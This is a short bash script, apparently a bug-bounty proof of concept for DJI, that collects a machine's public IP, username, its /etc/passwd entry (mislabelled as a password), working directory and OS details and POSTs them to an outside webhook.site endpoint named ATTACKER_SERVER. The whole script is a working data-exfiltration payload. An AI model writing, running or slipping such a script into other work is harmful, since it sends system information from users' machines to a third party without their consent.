#!/bin/bash

ATTACKER_SERVER="https://webhook.site/b3b1d464-ccae-4794-9854-1883189872d2"

IP=$(curl -s http://ipinfo.io/ip)
USERNAME=$(whoami)
PASSWORD=$(cat /etc/passwd 2>/dev/null | grep "$USERNAME" || echo "Password file not accessible")
CURRENT_DIR=$(pwd)
OS_DETAILS=$(uname -a)

DATA=$(cat <<EOF
{
    "ip": "$IP",
    "username": "$USERNAME",
    "password": "$PASSWORD",
    "current_directory": "$CURRENT_DIR",
    "os_details": "$OS_DETAILS"
}
EOF
)

curl -s -o /dev/null -X POST -H "Content-Type: application/json" -d "$DATA" "$ATTACKER_SERVER"

echo "DJI bugbounty poc"
